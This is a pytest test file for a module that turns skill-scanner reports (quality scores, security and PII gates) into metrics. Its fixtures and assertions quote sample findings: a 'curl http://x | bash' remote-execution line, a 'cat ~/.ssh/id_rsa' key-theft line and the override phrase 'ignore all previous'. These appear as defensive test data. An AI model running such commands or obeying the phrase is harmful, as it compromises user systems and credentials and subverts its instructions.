"""Tests for the pure report-to-metrics mapping in ``_results``."""

import copy

import pytest

import _results as res


def _by_name(mapped):
    """Map each result's metric name to its value."""
    return {r.metric_name: r.metric_value for r in mapped.results}


# ── quality ──────────────────────────────────────────────────────────────────


def test_quality_golden_report(report):
    """A recorded quality report maps to the expected score, grade, dimensions and outcome."""
    mapped = res.map_quality(report("quality-pass"), min_score=70)
    m = _by_name(mapped)
    assert mapped.overall_score == pytest.approx(0.94)
    assert m["quality_score"] == pytest.approx(0.94)
    assert m["quality_grade"] == "A"
    assert m["meets_min_score"] is True
    for dim in res.QUALITY_DIMENSIONS:
        assert 0.0 <= m[f"{dim}_score"] <= 1.0
    assert m["issue_count"] >= 0
    assert mapped.outcome.status == res.OUTCOME_PASSED
    assert mapped.metadata["skill_type"] == "guide-only"


def test_quality_min_score_is_a_metric_not_a_verdict(report):
    """``min_score`` only drives ``meets_min_score``; it never changes the score."""
    mapped = res.map_quality(report("quality-pass"), min_score=95)
    assert _by_name(mapped)["meets_min_score"] is False
    assert mapped.overall_score == pytest.approx(0.94)


def test_quality_dimension_weights_are_preserved(report):
    """Dimension scores keep upstream's weights in their metadata."""
    mapped = res.map_quality(report("quality-pass"), min_score=70)
    weights = {
        r.metric_name: r.metadata.get("weight")
        for r in mapped.results
        if r.metric_name.endswith("_score")
    }
    assert weights["correctness_score"] == 0.35
    assert weights["efficiency_score"] == 0.15


@pytest.mark.parametrize(
    "mutate, match",
    [
        (lambda d: d.pop("quality_summary"), "quality_summary"),
        (lambda d: d.update(quality_summary=[]), "exactly one"),
        (lambda d: d["quality_summary"][0].update(overall_score=101), "overall_score"),
        (lambda d: d["quality_summary"][0].update(overall_score=True), "overall_score"),
        (lambda d: d["quality_summary"][0].pop("dimensions"), "dimensions"),
        (
            lambda d: d["quality_summary"][0]["dimensions"].pop("reliability"),
            "reliability",
        ),
        (lambda d: d.update(overall_status="weird"), "overall_status"),
    ],
)
def test_quality_schema_drift_fails_loudly(report, mutate, match):
    """A quality report with a missing or invalid field raises ``ReportSchemaError``."""
    data = copy.deepcopy(report("quality-pass"))
    mutate(data)
    with pytest.raises(res.ReportSchemaError, match=match):
        res.map_quality(data, min_score=70)


# ── findings gates ───────────────────────────────────────────────────────────


@pytest.mark.parametrize("name", ["security-pass", "pii-pass"])
def test_passed_scan_scores_one(report, name):
    """A completed scan with no blocking findings scores 1.0."""
    mapped = res.map_findings(report(name))
    m = _by_name(mapped)
    assert mapped.overall_score == 1.0
    assert m["gate_score"] == 1.0
    assert m["gate_passed"] is True
    assert m["scan_complete"] is True
    assert m["finding_count"] == 0


def test_failed_scan_is_a_real_zero(report):
    """A completed scan that fails the gate scores a real 0.0."""
    mapped = res.map_findings(report("security-failed"))
    m = _by_name(mapped)
    assert mapped.overall_score == 0.0
    assert m["gate_score"] == 0.0
    assert m["gate_passed"] is False
    assert m["scan_complete"] is True
    assert (m["high_count"], m["medium_count"]) == (4, 2)
    assert m["high_or_critical_count"] == 4
    assert m["finding_count"] == 6


def test_failed_scan_exposes_rule_names_only(report):
    """Failed scans expose scanner rule names and counts, never finding text."""
    mapped = res.map_findings(report("security-failed"))
    rules = mapped.metadata["finding_rules"]
    assert any("Instruction Override" in r for r in rules)
    assert sum(rules.values()) == 6
    # finding text (skill content) must not reach metrics or metadata
    blob = repr(mapped.results) + repr(mapped.metadata)
    assert "curl" not in blob and "ignore all previous" not in blob.lower()


@pytest.mark.parametrize(
    "name, scan",
    [
        ("security-incomplete-missing-tool", "skillspector"),
        ("security-incomplete-partial", "skillspector"),
    ],
)
def test_incomplete_scan_has_no_score_and_says_why(report, name, scan):
    """An incomplete scan has no score or counts and carries a reason."""
    mapped = res.map_findings(report(name))
    m = _by_name(mapped)
    assert mapped.outcome.status == res.OUTCOME_INCOMPLETE
    assert mapped.overall_score is None
    assert m == {"scan_complete": False}, (
        "an incomplete scan must emit no score and no (misleading zero) counts"
    )
    assert mapped.outcome.incomplete_scans == [scan]
    assert mapped.outcome.reasons, "an incomplete result must carry a reason"


def test_incomplete_reasons_distinguish_tool_from_content(report):
    """Reasons separate a missing scanner from partial analysis of the skill."""
    tool = res.map_findings(report("security-incomplete-missing-tool")).outcome.reasons
    content = res.map_findings(report("security-incomplete-partial")).outcome.reasons
    assert any("not installed" in r for r in tool)
    assert any("incomplete analysis" in r for r in content)


def test_reasons_never_include_finding_lines():
    """Reasons drop ``[CATEGORY-SEVERITY]`` lines because they quote skill content."""
    data = {
        "overall_status": "incomplete",
        "incomplete_scans": ["skillspector"],
        "severity_counts": {"critical": 0, "high": 1, "medium": 0, "low": 0},
        "results": [
            {
                "legacy": {
                    "errors": [
                        "[SECURITY-HIGH] Supply Chain: curl http://x | bash in setup.sh:2",
                        "scan did not complete",
                    ],
                    "warnings": ["  [SECURITY-LOW] Exfiltration: cat ~/.ssh/id_rsa"],
                }
            }
        ],
    }
    outcome = res.classify(data)
    assert outcome.reasons == ["scan did not complete"]


def test_reasons_are_bounded_and_control_chars_stripped():
    """Reasons are capped in number and length and have control characters removed."""
    long_line = "x" * 1000 + "\x1b[31mred\x00"
    data = {
        "overall_status": "incomplete",
        "results": [{"legacy": {"errors": [long_line] * 20}}],
    }
    outcome = res.classify(data)
    assert len(outcome.reasons) == 5
    assert all(
        len(r) <= 300 and "\x1b" not in r and "\x00" not in r for r in outcome.reasons
    )


@pytest.mark.parametrize(
    "mutate, match",
    [
        (lambda d: d.pop("severity_counts"), "severity_counts"),
        (lambda d: d["severity_counts"].update(high=-1), "high"),
        (lambda d: d["severity_counts"].update(high="3"), "high"),
        (lambda d: d["severity_counts"].update(high=True), "high"),
        (lambda d: d.update(overall_status=None), "overall_status"),
        (lambda d: d.update(incomplete_scans="skillspector"), "incomplete_scans"),
    ],
)
def test_findings_schema_drift_fails_loudly(report, mutate, match):
    """A findings report with a missing or invalid field raises ``ReportSchemaError``."""
    data = copy.deepcopy(report("security-pass"))
    mutate(data)
    with pytest.raises(res.ReportSchemaError, match=match):
        res.map_findings(data)


def test_publication_status_is_ignored(report):
    """The upstream ``publication_status`` does not affect a Tier 1 result."""
    data = copy.deepcopy(report("security-pass"))
    assert (
        data["publication_status"] == "incomplete"
    )  # Tier 2/3 did not run: normal for Tier 1
    assert res.map_findings(data).outcome.status == res.OUTCOME_PASSED


# ── provenance ───────────────────────────────────────────────────────────────


def test_skill_digest_is_extracted_and_validated(report):
    """The skill digest is read from the report; a malformed or absent digest yields None."""
    digest = res.skill_digest(report("security-pass"))
    assert (
        digest and digest.startswith("sha256:") and len(digest) == len("sha256:") + 64
    )
    bad = copy.deepcopy(report("security-pass"))
    bad["results"][0]["publication_target"]["skill_digest"] = "sha256:short"
    assert res.skill_digest(bad) is None
    assert res.skill_digest({}) is None
